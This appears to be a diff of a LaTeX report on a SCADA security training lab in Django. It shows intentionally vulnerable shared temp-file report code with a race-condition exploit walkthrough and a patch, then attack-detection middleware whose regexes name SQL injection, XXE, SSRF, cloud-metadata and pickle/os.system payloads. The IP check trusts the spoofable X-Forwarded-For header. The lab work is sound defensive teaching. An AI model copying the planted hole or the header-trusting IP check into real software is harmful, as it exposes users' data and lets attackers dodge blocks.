+\subsubsection{Description}
+Diagnostic report PDFs are generated using a predictable temporary file path (\texttt{/tmp/scada\_report\_temp.pdf}) that is reused across ALL users. This enables information disclosure as one user's report can be accessed by another.
+
+\subsubsection{Vulnerable Code (vulnerable/views.py, Line 239)}
+
+\begin{lstlisting}[language=Python]
+def vulnerable_report(request):
+    report_id = request.GET.get('id', 1)
+    report_obj = DiagnosticReport.objects.get(id=report_id)
+
+    # VULNERABILITY: Predictable temp file - SAME for ALL users!
+    temp_filename = "/tmp/scada_report_temp.pdf"
+    
+    p = canvas.Canvas(temp_filename)
+    p.drawString(100, 800, f"SCADA CONFIDENTIAL REPORT #{report_obj.id}")
+    p.save()
+    
+    return FileResponse(open(temp_filename, 'rb'), 
+                       as_attachment=True)
+\end{lstlisting}
+
+\subsubsection{Exploitation}
+
+\begin{lstlisting}[language=bash]
+# Scenario: Race condition / concurrent access
+# Open two browser windows/tabs:
+
+# User A requests report ID 103:
+http://localhost:8000/vulnerable/report/?id=103
+# Server creates: /tmp/scada_report_temp.pdf (User A's data)
+
+# User B requests report ID 104 (BEFORE User A downloads):
+http://localhost:8000/vulnerable/report/?id=104
+# Server OVERWRITES: /tmp/scada_report_temp.pdf (now User B's data)
+
+# Result: User A receives report ID 104 (User B's confidential data)!
+
+# Verification inside Docker:
+docker exec -it scada_security_lab-web-1 bash
+ls -la /tmp/
+# File exists: scada_report_temp.pdf (reused for all requests)
+\end{lstlisting}
+
+\subsubsection{Monitoring Detection}
+
+Detected alongside IDOR (monitoring/middleware.py, Lines 208-223):
+
+\begin{lstlisting}[language=Python]
+# VULNERABILITY DETECTION #8: IDOR + UNSAFE TEMP FILES
+if not attack_detected and '/report/' in endpoint:
+    if 'id=' in full_path:
+        attack_detected = 'IDOR - Insecure Direct Object Reference'
+        # Implicit: Also indicates unsafe temp file usage
+\end{lstlisting}
+
+\subsubsection{Patch Implementation}
+
+The patched version eliminates temporary files (patched/views.py, Lines 106-142):
+
+\begin{lstlisting}[language=Python]
+def patched_report(request):
+    # ... authentication and authorization checks ...
+    
+    # FIX: Return report as HTTP response - NO temporary file!
+    response_text = (
+        f"SECURE REPORT #{report.id}\n"
+        f"Technician: {report.technician_name}\n"
+        f"Content: {report.content}"
+    )
+    return HttpResponse(response_text, content_type="text/plain")
+\end{lstlisting}
+
+\textbf{Key Mitigations:}
+\begin{enumerate}[leftmargin=*]
+    \item \textbf{No Temporary Files:} Reports returned directly as HTTP responses
+    \item \textbf{No Shared Resources:} Each request isolated
+    \item \textbf{Memory-Only:} Report data stays in memory (secure)
+\end{enumerate}
+
+\textbf{Verification:}
+\begin{lstlisting}[language=bash]
+# Test patched version:
+http://localhost:8000/patched/report/?id=103
+# Result: HTML page with report content (no PDF)
+
+# Check Docker container (no temp file):
+docker exec -it scada_security_lab-web-1 bash
+ls -la /tmp/
+# Result: scada_report_temp.pdf does NOT exist (patched!)
+\end{lstlisting}
 
 \newpage
 
 % Monitoring System
 \section{Monitoring System}
 
-\subsection{Architecture}
+\subsection{Architecture Overview}
 
-The monitoring system is implemented as Django middleware that intercepts all HTTP requests and applies pattern-based attack detection with severity classification, automated blocking, and admin action capabilities.
-
-\subsection{Key Features}
+The monitoring system is implemented as Django middleware (\texttt{SecurityMonitorMiddleware}) that intercepts all HTTP requests before they reach application views. This defense-in-depth approach ensures attack detection occurs even when vulnerabilities are patched. The system operates in three layers:
 
 \begin{itemize}[leftmargin=*]
-    \item \textbf{Severity Classification:} Four-level threat categorization (CRITICAL/HIGH/MEDIUM/LOW)
-    \item \textbf{Actionable Logging:} Each attack includes recommended actions and reverse procedures
-    \item \textbf{Brute Force Detection:} Tracks failed login attempts (5 attempts in 5 minutes = CRITICAL)
-    \item \textbf{Directory Scanning Detection:} Identifies port scanners (20+ 404s in 10 minutes = MEDIUM)
-    \item \textbf{Cookie Manipulation Detection:} Validates session integrity (HIGH severity)
-    \item \textbf{Automated IP Blocking:} Configurable auto-blocking for CRITICAL attacks
-    \item \textbf{Admin Actions:} One-click IP blocking, session revocation, and log resolution
-    \item \textbf{Statistics Dashboard:} Real-time attack metrics and threat overview
+    \item \textbf{Request Interception Layer:} Middleware examines all incoming HTTP requests
+    \item \textbf{Pattern Detection Layer:} Regex-based attack pattern matching with endpoint-specific rules
+    \item \textbf{Action Layer:} Automated logging, severity classification, and optional IP blocking
 \end{itemize}
 
-\subsection{Implementation}
+\subsection{Core Components}
+
+\subsubsection{Database Models}
+
+Three Django models support the monitoring infrastructure:
+
+\begin{lstlisting}[language=Python]
+class AttackLog(models.Model):
+    """Stores detected attack attempts with full context"""
+    ip_address = models.GenericIPAddressField()
+    endpoint = models.CharField(max_length=500)
+    attack_type = models.CharField(max_length=200)
+    payload = models.TextField()  # Request details (truncated to 500 chars)
+    severity = models.CharField(max_length=20)  # CRITICAL/HIGH/MEDIUM/LOW
+    recommended_action = models.TextField()
+    reverse_action = models.TextField()
+    action_taken = models.CharField(max_length=50, default='NONE')
+    is_resolved = models.BooleanField(default=False)
+    timestamp = models.DateTimeField(auto_now_add=True)
+
+class BlockedIP(models.Model):
+    """Tracks blocked IP addresses with admin controls"""
+    ip_address = models.GenericIPAddressField(unique=True)
+    reason = models.TextField()
+    blocked_by = models.CharField(max_length=100)  # Admin username
+    blocked_at = models.DateTimeField(auto_now_add=True)
+    is_permanent = models.BooleanField(default=False)
+    related_log = models.ForeignKey(AttackLog, null=True)
+
+class FailedLoginAttempt(models.Model):
+    """Tracks login attempts for brute force detection"""
+    ip_address = models.GenericIPAddressField()
+    username = models.CharField(max_length=150)
+    endpoint = models.CharField(max_length=500)
+    timestamp = models.DateTimeField(auto_now_add=True)
+\end{lstlisting}
+
+\subsubsection{Middleware Initialization}
+
+The middleware loads blocked IPs into memory on startup for fast lookups:
 
 \begin{lstlisting}[language=Python]
 class SecurityMonitorMiddleware:
     def __init__(self, get_response):
         self.get_response = get_response
-        self.blocked_ips = set(BlockedIP.objects.values_list(
-            'ip_address', flat=True))
-
-    def __call__(self, request):
-        client_ip = request.META.get('REMOTE_ADDR')
-        
-        # Check if IP is blocked
-        if client_ip in self.blocked_ips:
-            return HttpResponse("Access Denied: IP Blocked", status=403)
-        
-        full_path = request.get_full_path()
-        endpoint = request.path
-        body_content = request.body.decode('utf-8', errors='ignore')
-        
-        attack_detected = None
-        
-        # Endpoint-specific detection (13 attack types)
-        if '/login/' in endpoint:
-            if re.search(r"(?i)(is_admin=true|is_admin=1)", full_path):
-                attack_detected = 'Authentication Bypass'
-            # Brute force detection
-            self.check_brute_force(request, client_ip)
-        
-        elif '/dashboard/' in endpoint:
-            if re.search(r"(?i)(connector=OR|name__icontains=NUCLEAR)", full_path):
-                attack_detected = 'SQL Injection - Filter Bypass'
-        
-        # Cookie manipulation detection
-        if 'sessionid' in request.COOKIES:
-            if self.detect_cookie_manipulation(request):
-                attack_detected = 'Cookie Manipulation Attack'
-        
-        # ... 10 more attack types ...
-        
-        if attack_detected:
-            # Severity classification
-            severity, recommended_action, reverse_action = \
-                self.severity_classifier(attack_detected)
-            
-            # Create detailed log
-            log = AttackLog.objects.create(
-                ip_address=client_ip,
-                endpoint=endpoint,
-                attack_type=attack_detected,
-                payload=full_path[:500],
-                severity=severity,
-                recommended_action=recommended_action,
-                reverse_action=reverse_action
-            )
-            
-            # Conditional auto-blocking for CRITICAL attacks
-            auto_block_enabled = getattr(settings, 'ENABLE_AUTO_BLOCKING', True)
-            if severity == 'CRITICAL' and auto_block_enabled:
-                BlockedIP.objects.create(
-                    ip_address=client_ip,
-                    reason=f"Auto-blocked: {attack_detected}",
-                    blocked_by='System',
-                    related_log=log
-                )
-                log.action_taken = 'AUTO_BLOCKED'
-                log.save()
-                self.blocked_ips.add(client_ip)
-        
-        return self.get_response(request)
-    
-    def severity_classifier(self, attack_type):
-        """Maps attack types to severity levels with actions"""
-        if 'Brute Force' in attack_type:
-            return ('CRITICAL', 
-                    'Block IP immediately and review login logs',
-                    'Unblock IP: BlockedIP.objects.filter(ip="X").delete()')
-        elif 'SQL Injection' in attack_type:
-            return ('CRITICAL',
-                    'Block IP and audit database access logs',
-                    'Unblock IP + Review query logs')
-        elif 'Cookie Manipulation' in attack_type:
-            return ('HIGH',
-                    'Revoke user session and reset cookies',
-                    'User must re-login')
-        elif 'Directory Scanning' in attack_type:
-            return ('MEDIUM',
-                    'Monitor IP for 24h, block if persists',
-                    'Unblock after monitoring period')
-        else:
-            return ('LOW', 'Log and monitor', 'No action required')
-    
-    def check_brute_force(self, request, ip):
-        """Detects brute force attacks (5 attempts in 5 minutes)"""
-        if request.method == 'POST':
-            FailedLoginAttempt.objects.create(
-                ip_address=ip,
-                username=request.POST.get('username', ''),
-                endpoint=request.path
-            )
-            
-            five_min_ago = timezone.now() - timedelta(minutes=5)
-            recent_attempts = FailedLoginAttempt.objects.filter(
-                ip_address=ip,
-                timestamp__gte=five_min_ago
-            ).count()
-            
-            if recent_attempts >= 5:
-                AttackLog.objects.create(
-                    ip_address=ip,
-                    endpoint=request.path,
-                    attack_type='Brute Force Attack - Multiple Failed Logins',
-                    payload=f'{recent_attempts} attempts in 5 minutes',
-                    severity='CRITICAL',
-                    recommended_action='Block IP immediately'
-                )
-    
-    def detect_cookie_manipulation(self, request):
-        """Validates session cookie integrity"""
-        session_id = request.COOKIES.get('sessionid', '')
-        if not session_id:
-            return False
-        
-        # Check for suspicious patterns
-        suspicious = [
-            len(session_id) != 32,  # Django default length
-            not session_id.isalnum(),
-            session_id in ['admin', 'root', '12345']
-        ]
-        return any(suspicious)
+        # Cache blocked IPs in memory for O(1) lookup
+        self.blocked_ips = set(
+            BlockedIP.objects.values_list('ip_address', flat=True)
+        )
 \end{lstlisting}
 
-\subsection{Detection Patterns}
+\subsection{Detection Functionalities}
 
-\begin{table}[h]
-\centering
-\begin{tabular}{|p{3.5cm}|p{5cm}|p{2cm}|}
-\hline
-\textbf{Attack Type} & \textbf{Detection Pattern} & \textbf{Severity} \\
-\hline
-Brute Force & 5+ failed logins in 5min & CRITICAL \\
-\hline
-Authentication Bypass & \texttt{is\_admin=true|superuser=} & CRITICAL \\
-\hline
-SQL Injection & \texttt{connector=OR|UNION SELECT} & CRITICAL \\
-\hline
-Cookie Manipulation & Invalid session format/length & HIGH \\
-\hline
-XXE & \texttt{<!ENTITY|SYSTEM.*file://} & HIGH \\
-\hline
-SSRF & \texttt{localhost|127.0.0.1|169.254.*} & HIGH \\
-\hline
-IDOR & Access to admin reports (ID 1-10) & HIGH \\
-\hline
-Directory Scanning & 20+ 404 errors in 10min & MEDIUM \\
-\hline
-File Upload \& Overwrite & \texttt{.php|.exe|.sh|.py|.bat} & HIGH \\
-\hline
-Deserialization & POST to /deserialize/ & CRITICAL \\
-\hline
-\end{tabular}
-\caption{Attack Detection Patterns with Severity Levels}
-\end{table}
+\subsubsection{1. IP Blocking Check (First Defense Layer)}
+
+Before processing any request, the middleware verifies if the source IP is blocked:
+
+\begin{lstlisting}[language=Python]
+def __call__(self, request):
+    client_ip = request.META.get('HTTP_X_FORWARDED_FOR', '').split(',')[0].strip()
+    if not client_ip:
+        client_ip = request.META.get('REMOTE_ADDR', '')
+    
+    # IMMEDIATE BLOCK: Check if IP is in blocked list
+    if client_ip in self.blocked_ips:
+        return HttpResponse(
+            "403 Forbidden - Your IP address has been blocked due to suspicious activity.",
+            status=403
+        )
+\end{lstlisting}
+
+\textbf{Purpose:} Prevents known attackers from consuming server resources. This check occurs before any other processing, ensuring blocked IPs cannot interact with the application.
+
+\subsubsection{2. Request Context Extraction}
+
+The middleware extracts comprehensive request details for pattern matching:
+
+\begin{lstlisting}[language=Python]
+    # Extract all request components
+    full_path = request.get_full_path()  # URL with query parameters
+    endpoint = request.path              # URL path only
+    method = request.method              # GET/POST/PUT/DELETE
+    body_content = request.body.decode('utf-8', errors='ignore')[:1000]
+    
+    # Combine for comprehensive search space
+    search_space = f"{full_path} {body_content}"
+\end{lstlisting}
+
+\textbf{Rationale:} Attacks may appear in URLs (SQL injection), request bodies (XXE), or both. Comprehensive extraction ensures no attack vector is missed.
+
+\subsubsection{3. Brute Force Detection}
+
+Tracks failed login attempts with time-based thresholds:
+
+\begin{lstlisting}[language=Python]
+def check_brute_force(self, request, ip):
+    """Detects brute force attacks: 7+ = HIGH, 10+ = CRITICAL"""
+    if '/login/' in request.path and request.method in ['GET', 'POST']:
+        # Log this attempt
+        FailedLoginAttempt.objects.create(
+            ip_address=ip,
+            username=request.GET.get('username') or request.POST.get('username', ''),
+            endpoint=request.path
+        )
+        
+        # Count recent attempts from same IP
+        one_min_ago = timezone.now() - timedelta(minutes=1)
+        recent_attempts = FailedLoginAttempt.objects.filter(
+            ip_address=ip,
+            timestamp__gte=one_min_ago
+        ).count()
+        
+        # Apply thresholds
+        if recent_attempts >= 10:
+            severity = 'CRITICAL'
+            attack_type = f'Brute Force Attack - CRITICAL ({recent_attempts} attempts/min)'
+            recommended_action = 'IMMEDIATE: Block IP, review all login logs, check for credential stuffing'
+        elif recent_attempts >= 7:
+            severity = 'HIGH'
+            attack_type = f'Brute Force Attack - HIGH ({recent_attempts} attempts/min)'
+            recommended_action = 'Monitor IP closely, block if attempts continue'
+        else:
+            return  # Below threshold, no alert
+        
+        # Create attack log
+        AttackLog.objects.create(
+            ip_address=ip,
+            endpoint=request.path,
+            attack_type=attack_type,
+            payload=f'{recent_attempts} login attempts in 1 minute',
+            severity=severity,
+            recommended_action=recommended_action
+        )
+\end{lstlisting}
+
+\textbf{Key Features:}
+\begin{itemize}[leftmargin=*]
+    \item Two-tier severity: 7 attempts (HIGH), 10 attempts (CRITICAL)
+    \item Time window: 1 minute sliding window
+    \item Tracks username to identify credential stuffing patterns
+    \item Works on both GET and POST login requests
+\end{itemize}
+
+\subsubsection{4. Authentication Bypass Detection}
+
+Identifies URL parameter manipulation attempting privilege escalation:
+
+\begin{lstlisting}[language=Python]
+if not attack_detected and '/login/' in endpoint:
+    # Detection Pattern: is_admin=true, is_superuser=true
+    if re.search(r"(?i)(is_admin=true|is_admin=1|is_superuser=true|is_superuser=1)", search_space):
+        attack_detected = 'Authentication Bypass (CVE-2025-64459)'
+        severity = 'CRITICAL'
+        recommended_action = 'IMMEDIATE: Block IP, revoke all sessions, review authentication logs'
+        reverse_action = f'Unblock IP {client_ip}, restore legitimate sessions'
+\end{lstlisting}
+
+\textbf{Detection Logic:}
+\begin{itemize}[leftmargin=*]
+    \item Checks for \texttt{is\_admin=true/1} and \texttt{is\_superuser=true/1}
+    \item Case-insensitive regex (\texttt{(?i)}) catches evasion attempts
+    \item Only checks login endpoint to avoid false positives
+    \item CRITICAL severity due to potential full system compromise
+\end{itemize}
+
+\subsubsection{5. SQL Injection \& Privilege Escalation Detection (Dashboard \& Maintenance)}
+
+Monitors both \texttt{/dashboard/} and \texttt{/maintenance/} endpoints for filter bypass attacks:
+
+\begin{lstlisting}[language=Python]
+if not attack_detected and ('/dashboard/' in endpoint or '/maintenance/' in endpoint):
+    # PRIVILEGE ESCALATION CHECK
+    if re.search(r"(?i)(is_admin=true|is_admin=1|is_superuser=true)", search_space):
+        attack_detected = 'Privilege Escalation (CVE-2025-64459)'
+        severity = 'CRITICAL'
+        recommended_action = 'IMMEDIATE: Block IP, invalidate session, review logs'
+        reverse_action = f'Unblock IP {client_ip}, restore session if legitimate'
+    
+    # SQL INJECTION CHECK
+    elif re.search(r"(?i)(connector=OR|name__icontains=NUCLEAR)", search_space):
+        attack_detected = 'SQL Injection - Filter Bypass (CVE-2025-64459)'
+        severity = 'CRITICAL'
+        recommended_action = 'Block IP immediately, audit database access, check for data exfiltration'
+        reverse_action = f'Unblock IP {client_ip}, restore session'
+    
+    # GENERIC SQL INJECTION PATTERNS
+    elif re.search(r"(?i)(UNION\s+SELECT|1=1|\'|\"|--)", search_space):
+        attack_detected = 'SQL Injection'
+        severity = 'HIGH'
+        recommended_action = 'Block IP, audit database queries, check for compromised data'
+        reverse_action = f'Unblock IP {client_ip}'
+\end{lstlisting}
+
+\textbf{Three-Tier Detection:}
+\begin{enumerate}
+    \item \textbf{Privilege Escalation:} Attempts to elevate user role via URL parameters
+    \item \textbf{CVE-2025-64459 Exploit:} Specific Django Q() connector bypass with NUCLEAR device exposure
+    \item \textbf{Generic SQL Injection:} UNION SELECT, always-true conditions, SQL comment injection
+\end{enumerate}
+
+\subsubsection{6. File Upload Security (XXE \& Dangerous Extensions)}
+
+Monitors upload endpoint for XML External Entity attacks and malicious file types:
+
+\begin{lstlisting}[language=Python]
+if not attack_detected and '/upload/' in endpoint:
+    # XXE ATTACK DETECTION
+    if re.search(r"(?i)(<!ENTITY|<!DOCTYPE|SYSTEM\s+[\"']file://)", search_space):
+        attack_detected = 'XXE (XML External Entity) Attack (CVE-2025-64459)'
+        severity = 'HIGH'
+        recommended_action = 'Block IP, audit file system access logs, check for data exfiltration'
+        reverse_action = f'Unblock IP {client_ip}, remove uploaded files'
+    
+    # DANGEROUS FILE TYPES
+    elif re.search(r"(?i)\.(php|exe|sh|py|bat|jsp|asp)\"", search_space):
+        attack_detected = 'Dangerous File Upload - Executable Extension'
+        severity = 'HIGH'
+        recommended_action = 'Block upload, scan server for webshells, review upload directory'
+        reverse_action = 'Remove malicious files from upload directory'
+    
+    # PATH TRAVERSAL IN FILENAME
+    elif re.search(r"(?i)(filename.*\.\./|filename.*%2e%2e)", search_space):
+        attack_detected = 'Path Traversal via File Upload (CVE-2025-64459)'
+        severity = 'HIGH'
+        recommended_action = 'Block IP, check file system integrity, audit uploaded files'
+        reverse_action = f'Unblock IP {client_ip}, remove traversed files'
+\end{lstlisting}
+
+\textbf{Three Attack Vectors:}
+\begin{itemize}[leftmargin=*]
+    \item \textbf{XXE:} Detects XML entity declarations attempting to read server files
+    \item \textbf{Webshells:} Blocks executable extensions (.php, .exe, .sh, .py, .bat, .jsp, .asp)
+    \item \textbf{Path Traversal:} Identifies \texttt{../} sequences in filenames (URL-encoded or raw)
+\end{itemize}
+
+\subsubsection{7. IDOR (Insecure Direct Object Reference) Detection}
+
+Monitors report endpoint for unauthorized access to admin documents:
+
+\begin{lstlisting}[language=Python]
+if not attack_detected and '/report/' in endpoint:
+    # Extract report ID from URL
+    id_match = re.search(r'id=(\d+)', search_space)
+    if id_match:
+        id_val = int(id_match.group(1))
+        
+        # Admin reports are IDs 1-10
+        if 1 <= id_val <= 10:
+            attack_detected = f'IDOR - Admin Report Access Attempt (ID={id_val}, CVE-2025-64459)'
+            severity = 'HIGH'
+            recommended_action = f'Block IP, revoke session, audit accessed reports. WARNING: Temp file /tmp/scada_report_temp.pdf reused - data leakage risk!'
+            reverse_action = f'Unblock IP {client_ip}, user must re-authenticate'
+\end{lstlisting}
+
+\textbf{Detection Strategy:}
+\begin{itemize}[leftmargin=*]
+    \item Admin reports use predictable IDs 1-10 (owned by admin user)
+    \item Normal user reports start at ID 11+
+    \item Detects horizontal privilege escalation attempts
+    \item Highlights temp file vulnerability in recommended action
+\end{itemize}
+
+\subsubsection{8. SSRF (Server-Side Request Forgery) Detection}
+
+Identifies attempts to access internal network resources:
+
+\begin{lstlisting}[language=Python]
+if not attack_detected and '/ssrf/' in endpoint:
+    # INTERNAL IP DETECTION
+    if re.search(r"(?i)(localhost|127\.0\.0\.1|0\.0\.0\.0|169\.254\.|10\.\d+\.\d+\.\d+|192\.168\.|file://|dict://)", search_space):
+        attack_detected = 'SSRF - Internal Network Access Attempt (CVE-2025-64459)'
+        severity = 'HIGH'
+        recommended_action = 'Block IP immediately, audit internal network access logs, check for port scanning'
+        reverse_action = f'Unblock IP {client_ip}'
+    
+    # CLOUD METADATA ENDPOINT
+    elif re.search(r"(?i)(169\.254\.169\.254|metadata\.google|instance-data)", search_space):
+        attack_detected = 'SSRF - Cloud Metadata Service Access Attempt'
+        severity = 'CRITICAL'
+        recommended_action = 'IMMEDIATE: Block IP, rotate cloud credentials, check for credential theft'
+        reverse_action = f'Unblock IP {client_ip}, rotate compromised credentials'
+\end{lstlisting}
+
+\textbf{Two-Level Detection:}
+\begin{enumerate}
+    \item \textbf{Internal Network:} localhost, 127.0.0.1, RFC1918 addresses (10.x, 192.168.x), link-local (169.254.x)
+    \item \textbf{Cloud Metadata:} AWS/GCP metadata endpoints (169.254.169.254) - CRITICAL due to credential exposure risk
+\end{enumerate}
+
+\subsubsection{9. Deserialization Attack Detection}
+
+Monitors for Pickle/YAML deserialization exploits:
+
+\begin{lstlisting}[language=Python]
+if not attack_detected and '/deserialize/' in endpoint:
+    # PICKLE RCE PATTERNS
+    if re.search(r"(?i)(pickle|__reduce__|os\.system|subprocess|eval\(|exec\()", search_space):
+        attack_detected = 'Insecure Deserialization - RCE Attempt (CVE-2025-64459)'
+        severity = 'CRITICAL'
+        recommended_action = 'IMMEDIATE: Block IP, check server for backdoors, review process execution logs'
+        reverse_action = f'Unblock IP {client_ip}, scan for malware'
+    
+    # YAML DESERIALIZATION
+    elif re.search(r"(?i)(!!python/object|yaml\.load\()", search_space):
+        attack_detected = 'YAML Deserialization Attack'
+        severity = 'CRITICAL'
+        recommended_action = 'Block IP, check for remote code execution, audit system logs'
+        reverse_action = f'Unblock IP {client_ip}'
+\end{lstlisting}
+
+\textbf{RCE Detection Patterns:}
+\begin{itemize}[leftmargin=*]
+    \item Python Pickle magic methods: \texttt{\_\_reduce\_\_}
+    \item System command execution: \texttt{os.system}, \texttt{subprocess}
+    \item Code execution: \texttt{eval()}, \texttt{exec()}
+    \item YAML object instantiation: \texttt{!!python/object}
+\end{itemize}
+
+\subsubsection{10. Cookie Manipulation Detection}
+
+Validates session cookie integrity across all requests:
+
+\begin{lstlisting}[language=Python]
+def detect_cookie_manipulation(self, request):
+    """Validates Django session cookie format and integrity"""
+    session_id = request.COOKIES.get('sessionid', '')
+    if not session_id:
+        return False
+    
+    # Django sessionid characteristics:
+    # - Length: 32 characters
+    # - Format: Alphanumeric hex string
+    # - Generated by: secrets.token_hex(16)
+    
+    suspicious_patterns = [
+        len(session_id) != 32,           # Wrong length
+        not session_id.isalnum(),        # Contains special chars
+        session_id in ['admin', 'root', '12345', '00000000000000000000000000000000']
+    ]
+    
+    if any(suspicious_patterns):
+        AttackLog.objects.create(
+            ip_address=get_client_ip(request),
+            endpoint=request.path,
+            attack_type='Cookie Manipulation Attack',
+            payload=f'Invalid sessionid: {session_id[:20]}...',
+            severity='HIGH',
+            recommended_action='Revoke session, force re-authentication, monitor IP'
+        )
+        return True
+    
+    return False
+\end{lstlisting}
+
+\textbf{Validation Checks:}
+\begin{itemize}[leftmargin=*]
+    \item \textbf{Length:} Django uses 32-character hex strings
+    \item \textbf{Format:} Must be alphanumeric (0-9, a-f)
+    \item \textbf{Common Attacks:} Detects predictable values (admin, root, 12345)
+\end{itemize}
+
+\subsubsection{11. Directory Scanning \& Port Scanner Detection}
+
+Identifies reconnaissance activity through 404 error patterns:
+
+\begin{lstlisting}[language=Python]
+def check_directory_scanning(self, request, client_ip):
+    """Detects port scanners and directory brute force (20+ 404s in 10 min)"""
+    ten_min_ago = timezone.now() - timedelta(minutes=10)
+    
+    # Count 404 errors from this IP
+    recent_404s = AttackLog.objects.filter(
+        ip_address=client_ip,
+        attack_type='404 - Not Found',
+        timestamp__gte=ten_min_ago
+    ).count()
+    
+    # Threshold: 20+ = reconnaissance activity
+    if recent_404s >= 20:
+        AttackLog.objects.create(
+            ip_address=client_ip,
+            endpoint='/multiple',
+            attack_type='Directory Scanning / Port Scanner Detected',
+            payload=f'{recent_404s} 404 errors in 10 minutes',
+            severity='MEDIUM',
+            recommended_action='Monitor IP for 24h, block if activity persists, check firewall logs'
+        )
+\end{lstlisting}
+
+\textbf{Rationale:}
+\begin{itemize}[leftmargin=*]
+    \item Automated scanners generate many 404s quickly
+    \item Threshold of 20 in 10 minutes filters legitimate mistyped URLs
+    \item MEDIUM severity (reconnaissance, not exploitation)
+\end{itemize}
+
+\subsubsection{12. Severity Classification Engine}
+
+Centralizes severity levels and recommended actions:
+
+\begin{lstlisting}[language=Python]
+def get_severity_and_actions(self, attack_type):
+    """Maps attack types to severity with actionable responses"""
+    
+    # CRITICAL THREATS (Immediate system compromise risk)
+    if any(x in attack_type for x in ['Brute Force', 'CVE-2025-64459', 
+           'Deserialization', 'SQL Injection', 'Cloud Metadata']):
+        return (
+            'CRITICAL',
+            'IMMEDIATE: Block IP, revoke sessions, audit logs, check for data exfiltration',
+            'Unblock IP after thorough security review'
+        )
+    
+    # HIGH THREATS (Significant security risk)
+    elif any(x in attack_type for x in ['XXE', 'SSRF', 'IDOR', 
+            'Cookie Manipulation', 'File Upload', 'Privilege Escalation']):
+        return (
+            'HIGH',
+            'Block IP, revoke session, audit affected systems',
+            'Unblock IP after investigation'
+        )
+    
+    # MEDIUM THREATS (Reconnaissance activity)
+    elif 'Directory Scanning' in attack_type or 'Port Scanner' in attack_type:
+        return (
+            'MEDIUM',
+            'Monitor IP for 24 hours, block if activity continues',
+            'No action needed if activity stops'
+        )
+    
+    # LOW THREATS (Anomalous but not dangerous)
+    else:
+        return (
+            'LOW',
+            'Log and monitor, no immediate action required',
+            'No action needed'
+        )
+\end{lstlisting}
+
+\subsection{Automated Response System}
+
+\subsubsection{Auto-Blocking for CRITICAL Attacks}
+
+The system can automatically block IPs for CRITICAL severity attacks:
+
+\begin{lstlisting}[language=Python]
+# Create attack log
+log = AttackLog.objects.create(
+    ip_address=client_ip,
+    endpoint=endpoint,
+    attack_type=attack_detected,
+    payload=search_space[:500],
+    severity=severity,
+    recommended_action=recommended_action,
+    reverse_action=reverse_action
+)
+
+# Auto-block CRITICAL attacks (if enabled)
+auto_block_enabled = getattr(settings, 'ENABLE_AUTO_BLOCKING', True)
+
+if severity == 'CRITICAL' and auto_block_enabled:
+    # Create block entry
+    BlockedIP.objects.create(
+        ip_address=client_ip,
+        reason=f"Auto-blocked: {attack_detected}",
+        blocked_by='System',
+        related_log=log
+    )
+    
+    # Update in-memory cache
+    self.blocked_ips.add(client_ip)
+    
+    # Mark log as blocked
+    log.action_taken = 'AUTO_BLOCKED'
+    log.save()
+\end{lstlisting}
+
+\textbf{Configuration:}
+\begin{lstlisting}[language=Python]
+# settings.py
+ENABLE_AUTO_BLOCKING = False  # Set True for production, False for demos
+\end{lstlisting}
 
 \subsection{Admin Action Interface}
 
-The monitoring dashboard provides administrators with actionable controls:
+\subsubsection{Manual IP Blocking}
+
+Administrators can manually block IPs from the log viewer:
 
 \begin{lstlisting}[language=Python]
 def block_ip_action(request, log_id):
-    """Manually block an IP from attack log"""
+    """Manually block an IP address (Admin only)"""
+    # Verify admin permission
+    user = request.session.get('user', {})
+    if not user.get('is_admin'):
+        return JsonResponse({'status': 'error', 'message': 'Unauthorized'}, status=403)
+    
     log = get_object_or_404(AttackLog, id=log_id)
+    
+    # Create block entry
     BlockedIP.objects.get_or_create(
         ip_address=log.ip_address,
         defaults={
-            'reason': f"Manual block: {log.attack_type}",
-            'blocked_by': request.user.username,
+            'reason': f"Manual block for {log.attack_type}",
+            'blocked_by': user.get('username', 'admin'),
             'related_log': log
         }
     )
+    
+    # Update log status
     log.action_taken = 'BLOCKED'
     log.save()
-    return redirect('log_viewer')
-
-def revoke_session_action(request, log_id):
-    """Revoke user session for suspicious activity"""
-    log = get_object_or_404(AttackLog, id=log_id)
-    # Find and delete sessions from this IP
-    Session.objects.filter(
-        session_data__contains=log.ip_address
-    ).delete()
-    log.action_taken = 'SESSION_REVOKED'
-    log.save()
-    return redirect('log_viewer')
-
-def resolve_log_action(request, log_id):
-    """Mark attack log as resolved"""
-    log = get_object_or_404(AttackLog, id=log_id)
-    notes = request.POST.get('notes', '')
-    log.mark_resolved(request.user.username, notes)
-    return redirect('log_viewer')
+    
+    return JsonResponse({'status': 'success', 'message': f'IP {log.ip_address} blocked'})
 \end{lstlisting}
 
-\subsection{Statistics Dashboard}
+\subsubsection{IP Unblocking}
 
-Real-time metrics displayed on monitoring page:
-
-\begin{itemize}[leftmargin=*]
-    \item \textbf{Critical Attacks:} Count of CRITICAL severity incidents
-    \item \textbf{High Priority:} Count of HIGH severity incidents  
-    \item \textbf{Unresolved Logs:} Attacks requiring admin review
-    \item \textbf{Blocked IPs:} Currently blacklisted addresses
-\end{itemize}
-
-\subsection{Configurable Auto-Blocking}
-
-The system includes a presentation mode flag:
+Admins can unblock IPs if blocks were incorrect:
 
 \begin{lstlisting}[language=Python]
-# settings.py
-ENABLE_AUTO_BLOCKING = False  # Set True for production
-
-# middleware.py checks this before auto-blocking
-auto_block_enabled = getattr(settings, 'ENABLE_AUTO_BLOCKING', True)
-if severity == 'CRITICAL' and auto_block_enabled:
-    # Auto-block the IP
+def unblock_ip_action(request, blocked_ip_id):
+    """Remove IP from blocklist (Admin only)"""
+    user = request.session.get('user', {})
+    if not user.get('is_admin'):
+        return JsonResponse({'status': 'error', 'message': 'Unauthorized'}, status=403)
+    
+    blocked_ip = get_object_or_404(BlockedIP, id=blocked_ip_id)
+    ip_address = blocked_ip.ip_address
+    
+    # Delete block entry
+    blocked_ip.delete()
+    
+    # Update related log if exists
+    if blocked_ip.related_log:
+        blocked_ip.related_log.action_taken = 'REVIEWED'
+        blocked_ip.related_log.save()
+    
+    return JsonResponse({'status': 'success', 'message': f'IP {ip_address} unblocked'})
 \end{lstlisting}
 
-This allows demonstrations without interruption while maintaining production-ready blocking capabilities.
+\subsubsection{Session Revocation}
+
+Force logout for suspicious sessions:
+
+\begin{lstlisting}[language=Python]
+def revoke_session_action(request, log_id):
+    """Revoke user session for suspicious activity (Admin only)"""
+    user = request.session.get('user', {})
+    if not user.get('is_admin'):
+        return JsonResponse({'status': 'error', 'message': 'Unauthorized'}, status=403)
+    
+    log = get_object_or_404(AttackLog, id=log_id)
+    
